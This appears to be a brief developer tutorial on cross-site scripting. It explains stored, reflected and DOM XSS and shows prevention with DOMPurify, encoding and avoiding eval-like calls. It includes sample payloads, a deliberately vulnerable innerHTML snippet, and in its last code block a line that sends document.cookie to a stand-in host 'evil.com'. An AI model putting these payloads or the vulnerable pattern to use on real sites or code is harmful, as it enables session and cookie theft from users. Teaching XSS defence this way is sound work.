## XSS (CROSS site scripting)

Cross-site scripting takes place when a hacker is able to inject and execute a malicious script and this usually happens because of human error and unnoticed bugs.

**Three Types of XSS as follows:**
# *1. Stored XSS*
1. In stored XSS the script is stored in the database and when accessed from the server, it is executed on the client side which could result in the compromisation.

2. Suppose you are chatting with someone, and you send a script like:
````
<script>code to acccess some important info </script>
````
and this will be saved on DB.

3. now when some open script will be exectuted and can access the data.

# *2. Reflected XSS*
1. Reflected XSS, unlike stored does not require to be stored in a database, but depending on the type of rendering pattern.

2. For example, suppose you are querying an SSR application with the following URL:

````
http://xyz.com?q=<script>alert('XSS Attack')</script>  
````

3. If the application directly renders the input without proper sanitization, the script will execute in another user's browser when they visit the link. This could allow an attacker to access sensitive data, such as the control panel.



# *3. DOM XSS*
1. It happens entirely on the client side.

2. Suppose a website dynamically updates the page content based on the URL parameter without proper sanitization:

````
<script>
   const params = new URLSearchParams(window.location.search);
   document.getElementById("message").innerHTML = params.get("msg");
</script>

<div id="message"></div>

````
3. Attacker can execute : 
````
http://example.com/?msg=<script>alert('Hacked!')</script>
````
4. When a victim clicks the link, the JavaScript extracts the msg parameter from the URL.

## *Preventing cross-site (XSS) attack*
1.  stanitization of string - All the modern frameworks sanitize the string before rendering them to avoid the XSS attack. Wherever possible the strings are rendered as it is. For example, in React, the strings are rendered as it is, if you to render a string as HTML you will have to use.

2. use DOMPurify like npm package , which helps to detect any xss attacks.

3. Case where the string has to be displayed as it is, the string can be encoded to escape them like &amp...etc.

4. cryptography for request body hasing.

## dangerouslySetInnerHTML
**dangerouslySetInnerHTML** is a special React prop that allows you to insert raw HTML directly into the DOM.

```js
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// if user content is below with some scripting :  then XSS happens
<img src=x onerror=alert(1)>
```
so use DomPurify 
```js
import DOMPurify from "dompurify";

const safeHTML = DOMPurify.sanitize(userContent);

<div dangerouslySetInnerHTML={{ __html: safeHTML }} />

```
Never use below : 

```js
//Because when you pass a string, JavaScript treats it as code, not data.
setTimeout("alert('Hacked')", 1000);
//Internally, JS does something like:
eval("alert('Hacked')");
// new Function() is equivalent to eval() and should almost never be used.
const fn = new Function("a", "b", "return a + b");
fn(2, 3); // 5

// Now think of 
new Function(userInput)();
userInput = "fetch('https://evil.com?c='+document.cookie)";
```
